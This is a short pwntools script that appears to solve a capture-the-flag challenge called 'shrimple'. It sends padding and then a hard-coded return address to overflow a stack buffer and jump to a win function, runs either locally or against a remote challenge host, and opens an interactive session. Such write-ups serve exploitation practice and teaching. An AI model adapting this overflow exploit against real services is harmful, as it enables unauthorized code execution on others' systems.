import argparse
from pwn import *

TARGET = "./shrimple"
REMOTE = ("brop.challenges.cfd", 5000)

context.log_level = "debug"
context.binary = TARGET

def exploit(r, e):
    gdb.attach(r)

    offset = 38
    win = p64(0x40127d+5)

    r.sendline(43*b'A' + b'\x00')
    r.sendline(42*b'A' + b'\x00')
    r.sendline(offset * b'A' + win)

    r.interactive()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-r", "--remote", action="store_true", dest="remote",
                        help="Run exploit on the remote target.")
    args = parser.parse_args()

    if args.remote:
        r = remote(*REMOTE)
    else:
        r = process(TARGET)

    e = ELF(TARGET)
    exploit(r, e)

if __name__ == "__main__":
    main()
